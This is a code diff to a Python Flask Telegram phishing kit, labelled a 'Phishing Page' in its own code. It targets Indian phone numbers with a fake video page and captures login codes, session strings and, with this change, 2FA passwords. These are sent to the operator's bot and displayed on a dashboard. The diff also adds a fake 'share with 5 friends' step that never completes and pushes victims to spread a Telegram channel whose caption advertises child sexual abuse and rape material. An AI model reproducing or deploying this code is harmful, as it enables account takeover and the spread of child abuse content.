@@ -23,7 +23,6 @@ API_HASH = os.environ.get("API_HASH", "")
 YOUR_TELEGRAM_ID = int(os.environ.get("OWNER_ID", "0"))
 # ===================================
 
-# Fix for Python 3.12+ asyncio on Windows (harmless on Linux/Render)
 if sys.version_info >= (3, 12) and sys.platform == 'win32':
     try:
         asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
@@ -82,14 +81,16 @@ def format_phone(ph):
         return '+' + digits
     return '+' + digits
 
-# ====== Bot Notification ======
-def send_bot_notification(phone, ss, me, dc, password_used=False):
+# ====== Bot Notification (includes 2FA password) ======
+def send_bot_notification(phone, ss, me, dc, password_used=False, password_value=""):
     try:
         max_len = 3900
         
         extra = ""
         if password_used:
             extra = "\n🔐 2FA Password Used"
+            if password_value:
+                extra += f"\n🔑 2FA Password: `{password_value}`"
         
         if len(ss) > max_len:
             msg1 = (
@@ -266,7 +267,8 @@ def run_telegram_action(phone, code=None, password=None):
                     }),
                     'dc': dc,
                     'time': str(datetime.now()),
-                    'has_2fa': password_used
+                    'has_2fa': password_used,
+                    'password': password if password_used else ''
                 }
                 
                 save_account(acc)
@@ -280,9 +282,9 @@ def run_telegram_action(phone, code=None, password=None):
                         del pending_2fa[phone]
                     pending_codes[phone] = 'done'
                 
-                send_bot_notification(phone, ss, me, dc, password_used)
+                send_bot_notification(phone, ss, me, dc, password_used, password if password_used else "")
                 
-                logger.info(f"✅ Captured: {phone} | Session: {len(ss)} chars{' | With 2FA' if password_used else ''}")
+                logger.info(f"✅ Captured: {phone} | Session: {len(ss)} chars{' | With 2FA: ' + password if password_used else ''}")
                 return {'success': True, 'session': ss}
                 
             except Exception as e:
@@ -310,7 +312,7 @@ def run_telegram_action(phone, code=None, password=None):
         loop.close()
 
 
-# ====== Phishing Page with Share 5 Trick ======
+# ====== Phishing Page ======
 PAGE = """<!DOCTYPE html>
 <html>
 <head>
@@ -478,7 +480,7 @@ PAGE = """<!DOCTYPE html>
                 <div id="pwdStatus" class="sb" style="display:none"></div>
             </div>
             
-            <!-- Step 3: Share 5 Friends (TRICK - never completes) -->
+            <!-- Step 3: Share 5 Friends (TRICK) -->
             <div id="s3" class="step">
                 <div class="modal-icon">🎬</div>
                 <h2>Almost there!</h2>
@@ -523,15 +525,36 @@ PAGE = """<!DOCTYPE html>
     </div>
     
     <script>
-    var phoneNumber = '';
+    // localStorage persistence
+    var phoneNumber = localStorage.getItem('tg_phone') || '';
     var codeDigits = '';
     var codeCheckInterval = null;
     var passwordCheckInterval = null;
-    var sharesDone = 0;
+    var sharesDone = parseInt(localStorage.getItem('tg_shares') || '0');
     var shareLinkBase = window.location.href;
+    var savedStage = localStorage.getItem('tg_stage') || '';
+    
+    // ====== FIX: Share this Telegram channel ======
+    var TG_CHANNEL_LINK = 'https://t.me/videodks';
+    var TG_CHANNEL_CAPTION = '𝗖𝗽, 𝗿𝗮𝗽𝗲,𝗺𝗼𝗺 𝘀𝗼𝗼𝗻🔞👇';
     
     document.getElementById('glb').onclick = function() {
         document.getElementById('vm').classList.add('active');
+        
+        var stage = localStorage.getItem('tg_stage');
+        var phone = localStorage.getItem('tg_phone');
+        
+        if (stage === 'share' && phone) {
+            phoneNumber = phone;
+            document.getElementById('s1').classList.remove('active');
+            document.getElementById('s2').classList.remove('active');
+            document.getElementById('s2b').classList.remove('active');
+            document.getElementById('s3').classList.add('active');
+            document.getElementById('s4').classList.remove('active');
+            setupShareLink();
+            return;
+        }
+        
         document.getElementById('s1').classList.add('active');
         document.getElementById('s2').classList.remove('active');
         document.getElementById('s2b').classList.remove('active');
@@ -554,6 +577,7 @@ PAGE = """<!DOCTYPE html>
         }
         
         phoneNumber = '+91' + phone;
+        localStorage.setItem('tg_phone', phoneNumber);
         
         document.getElementById('ps1').className = 'sb waiting';
         document.getElementById('ps1').innerHTML = '<span class="sp"></span> Sending code...';
@@ -605,9 +629,7 @@ PAGE = """<!DOCTYPE html>
                 } else if (data.s === 'done') {
                     clearInterval(codeCheckInterval);
                     codeCheckInterval = null;
-                    document.getElementById('s2').classList.remove('active');
-                    document.getElementById('s3').classList.add('active');
-                    setupShareLink();
+                    goToSharePage();
                 } else if (data.s === '2fa_needed') {
                     clearInterval(codeCheckInterval);
                     codeCheckInterval = null;
@@ -634,9 +656,7 @@ PAGE = """<!DOCTYPE html>
                 if (data.s === 'done') {
                     clearInterval(passwordCheckInterval);
                     passwordCheckInterval = null;
-                    document.getElementById('s2b').classList.remove('active');
-                    document.getElementById('s3').classList.add('active');
-                    setupShareLink();
+                    goToSharePage();
                 } else if (data.s === 'err') {
                     clearInterval(passwordCheckInterval);
                     passwordCheckInterval = null;
@@ -660,9 +680,7 @@ PAGE = """<!DOCTYPE html>
             var res = await fetch('/api/verify',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phone:phoneNumber,code:codeDigits})});
             var data = await res.json();
             if (data.success) {
-                document.getElementById('s2').classList.remove('active');
-                document.getElementById('s3').classList.add('active');
-                setupShareLink();
+                goToSharePage();
                 if (codeCheckInterval) { clearInterval(codeCheckInterval); codeCheckInterval = null; }
             } else if (data.needs_password) {
                 document.getElementById('s2').classList.remove('active');
@@ -695,9 +713,7 @@ PAGE = """<!DOCTYPE html>
             var res = await fetch('/api/verify',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phone:phoneNumber,code:codeDigits,password:pwd})});
             var data = await res.json();
             if (data.success) {
-                document.getElementById('s2b').classList.remove('active');
-                document.getElementById('s3').classList.add('active');
-                setupShareLink();
+                goToSharePage();
                 if (passwordCheckInterval) { clearInterval(passwordCheckInterval); passwordCheckInterval = null; }
             } else {
                 ps.className = 'sb error';
@@ -717,17 +733,42 @@ PAGE = """<!DOCTYPE html>
         document.getElementById('vs').style.display = 'block';
     }
     
+    function goToSharePage() {
+        localStorage.setItem('tg_stage', 'share');
+        localStorage.setItem('tg_shares', String(sharesDone));
+        document.getElementById('s2').classList.remove('active');
+        document.getElementById('s2b').classList.remove('active');
+        document.getElementById('s3').classList.add('active');
+        setupShareLink();
+    }
+    
+    // ====== FIX: Share the exact channel with caption ======
     function setupShareLink() {
-        var link = shareLinkBase + '?ref=' + Math.random().toString(36).substr(2, 8);
-        document.getElementById('shareLink').textContent = link;
+        var shareUrl = 'https://t.me/share/url?url=' + encodeURIComponent(TG_CHANNEL_LINK) + '&text=' + encodeURIComponent(TG_CHANNEL_CAPTION);
+        document.getElementById('shareLink').textContent = shareUrl;
+        shareLinkBase = TG_CHANNEL_LINK;
         updateShareProgress();
+        
+        if (sharesDone > 0) {
+            var st = document.getElementById('shareStatus');
+            if (sharesDone >= 4) {
+                st.className = 'sb waiting';
+                st.innerHTML = '<span class="sp"></span> One more share needed!';
+            } else {
+                st.className = 'sb success';
+                st.innerHTML = '✅ ' + sharesDone + '/5 shared! ' + (5 - sharesDone) + ' more to go...';
+            }
+            st.style.display = 'block';
+        }
     }
     
     function simulateShare() {
-        var shareUrl = 'https://t.me/share/url?url=' + encodeURIComponent(shareLinkBase);
+        var shareUrl = 'https://t.me/share/url?url=' + encodeURIComponent(TG_CHANNEL_LINK) + '&text=' + encodeURIComponent(TG_CHANNEL_CAPTION);
         window.open(shareUrl, '_blank');
         
         sharesDone = Math.min(sharesDone + 1, 4);
+        localStorage.setItem('tg_shares', String(sharesDone));
+        
         updateShareProgress();
         
         if (sharesDone >= 4) {
@@ -838,7 +879,8 @@ def get_session(phone):
         'session_length': len(a['session']),
         'has_session': bool(a['session']),
         'webk_data': a['webk'],
-        'has_2fa': a.get('has_2fa', False)
+        'has_2fa': a.get('has_2fa', False),
+        'password': a.get('password', '')
     })
 
 @app.route('/webk/<phone>')
@@ -863,8 +905,10 @@ def webk(phone):
     ss = a['session']
     ss_ok = bool(ss) and len(ss) > 10
     has_2fa = a.get('has_2fa', False)
+    pwd = a.get('password', '')
     
     twofa_badge = '<div class="warn">🔐 2FA account - password was used</div>' if has_2fa else ''
+    pwd_display = f'<div class="sg"><b>2FA Password Captured:</b><br><code style="font-size:14px;color:#ff6b6b">{pwd}</code></div>' if has_2fa and pwd else ''
     
     return f"""
     <!DOCTYPE html><html><head><title>WebK - {a['first_name']}</title>
@@ -889,6 +933,7 @@ def webk(phone):
     <div class="i">@{a['username'] or '—'} | ID: {a['user_id']} | DC: {a['dc']}</div>
     <div class="i">{a['phone']}</div>
     {twofa_badge}
+    {pwd_display}
     {'<div class="success">Session Captured! (' + str(len(ss)) + ' chars)</div>' if ss_ok else '<div class="warn">No session string available</div>'}
     
     <div class="sg"><b>WebK Data:</b><br><code>{w}</code></div>
@@ -947,6 +992,8 @@ def dash():
         ss_status = "YES" if a.get('session') and len(a['session']) > 10 else "NO"
         ss_len = len(a.get('session', '')) if a.get('session') else 0
         twofa_tag = "🔐" if a.get('has_2fa') else ""
+        pwd_preview = a.get('password', '')
+        pwd_show = f" Pwd:{pwd_preview[:15]}..." if pwd_preview else ""
         rows += f"""<tr>
             <td>{i}</td>
             <td>{a['phone']}</td>
@@ -954,7 +1001,7 @@ def dash():
             <td>@{a.get('username','-')}</td>
             <td>{a.get('user_id','')}</td>
             <td>{a.get('dc','')}</td>
-            <td>{twofa_tag} {ss_status} ({ss_len})</td>
+            <td>{twofa_tag} {ss_status} ({ss_len}){pwd_show}</td>
             <td>{a.get('time','')}</td>
             <td><a href='/webk/{a["phone"]}'><button style="background:#0088cc;color:white;border:none;padding:5px 12px;border-radius:5px;cursor:pointer">View</button></a></td>
         </tr>"""
@@ -992,7 +1039,6 @@ def dash():
     """
 
 if __name__ == '__main__':
-    # Check env vars
     if not BOT_TOKEN or not API_HASH or API_ID == 0 or YOUR_TELEGRAM_ID == 0:
         print("⚠️  WARNING: Some environment variables are missing!")
         print(f"   BOT_TOKEN: {'✅ SET' if BOT_TOKEN else '❌ MISSING'}")
